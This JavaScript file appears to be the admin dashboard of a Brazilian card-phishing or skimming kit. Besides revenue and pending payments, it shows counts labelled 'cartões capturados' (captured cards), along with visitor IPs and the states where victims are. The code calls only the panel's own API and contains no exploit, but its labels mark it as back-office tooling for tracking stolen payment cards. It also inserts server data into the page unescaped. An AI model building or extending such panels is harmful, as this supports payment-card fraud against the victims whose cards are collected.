const API_BASE = '';

async function fetchWithAuth(url) {
    const res = await fetch(url, {
        headers: { 'Authorization': `Bearer ${getCookie('auth_token')}` }
    });
    if (res.status === 401) {
        window.location.href = '/admin/login';
        return null;
    }
    return res;
}

function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

async function loadDashboard() {
    try {
        const res = await fetchWithAuth('/api/analytics/dashboard');
        if (!res) return;
        const data = await res.json();

        document.getElementById('totalSales').textContent = data.total_pageviews || '0';
        document.getElementById('totalRevenue').textContent = `R$ ${(data.revenue || 0).toFixed(2)}`;
        document.getElementById('totalClients').textContent = data.total_cards || '0';
        document.getElementById('pendingPayments').textContent = data.pending_payments || '0';
        document.getElementById('salesChange').textContent = 'Carregando dados...';
        document.getElementById('revenueChange').textContent = 'Carregando dados...';
        document.getElementById('totalClients').textContent = data.total_cards || '0';
        document.getElementById('clientsChange').textContent = `${data.total_cards || 0} cartões capturados`;
        document.getElementById('pendingChange').textContent = `${data.pending_payments || 0} pendentes`;

        if (data.top_states && data.top_states.length > 0) {
            const regionsList = document.getElementById('regionsList');
            if (regionsList) {
                regionsList.innerHTML = data.top_states.map(s => `
                    <div style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border-color);">
                        <span style="color: var(--text-secondary);">${s.state}</span>
                        <span style="font-weight: 600;">${s.count}</span>
                    </div>
                `).join('');
            }
        }
    } catch (e) {
        console.error(e);
    }
}

async function loadActivity() {
    try {
        const res = await fetchWithAuth('/api/metrics');
        if (!res) return;
        const data = await res.json();
        const activityList = document.getElementById('activityList');
        if (activityList && data.logs) {
            activityList.innerHTML = data.logs.slice(0, 10).map(log => `
                <div class="activity-item">
                    <div class="activity-icon blue">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/></svg>
                    </div>
                    <div class="activity-content">
                        <div class="activity-title">${log.event_type}</div>
                        <div class="activity-meta">${log.ip} • ${log.timestamp}</div>
                    </div>
                </div>
            `).join('');
        }
    } catch (e) {
        console.error(e);
    }
}

function setupNavigation() {
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const page = item.dataset.page;
            if (page) {
                window.location.href = `/admin/${page}`;
            }
        });
    });
}

function setupLogout() {
    const logoutBtn = document.getElementById('logoutBtn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', async () => {
            await fetch('/api/auth/logout', { method: 'POST' });
            window.location.href = '/admin/login';
        });
    }
}

function setupTimeFilter() {
    const buttons = document.querySelectorAll('.time-filter-btn');
    buttons.forEach(btn => {
        btn.addEventListener('click', () => {
            buttons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        });
    });
}

document.addEventListener('DOMContentLoaded', () => {
    setupNavigation();
    setupLogout();
    setupTimeFilter();
    loadDashboard();
    loadActivity();
});